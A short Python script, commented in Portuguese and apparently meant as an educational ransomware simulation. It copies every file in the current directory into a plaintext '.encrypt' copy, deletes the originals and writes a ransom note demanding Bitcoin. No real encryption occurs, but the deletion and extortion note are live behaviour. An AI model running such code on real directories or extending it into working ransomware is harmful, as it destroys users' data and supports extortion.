import os

# Simula os arquivos da vítima
arquivos = []

# Percorre os arquivos do diretório atual
for arquivo in os.listdir():
    if arquivo == "ransom.py" or arquivo.endswith(".key") or arquivo.endswith(".decrypt"):
        continue
    if os.path.isfile(arquivo):
        arquivos.append(arquivo)

# Gera uma "chave falsa"
chave = "chave-secreta-ficticia"

# Cria um arquivo para simular os dados "criptografados"
for arquivo in arquivos:
    with open(arquivo, "rb") as f:
        conteudo = f.read()
    with open(arquivo + ".encrypt", "wb") as f:
        f.write(b"ENCRYPTED DATA WITH FAKE KEY:\n")
        f.write(conteudo)
    os.remove(arquivo)  # Remove o original para simular o ataque

# Cria a mensagem de resgate
with open("READ_ME.txt", "w") as f:
    f.write("Seus arquivos foram sequestrados!\n")
    f.write("Para recuperá-los, envie 100 Bitcoin para o endereço XYZ.\n")
    f.write("Essa é só uma simulação educativa. Não entre em pânico!\n")

print("Ataque simulado concluído.")
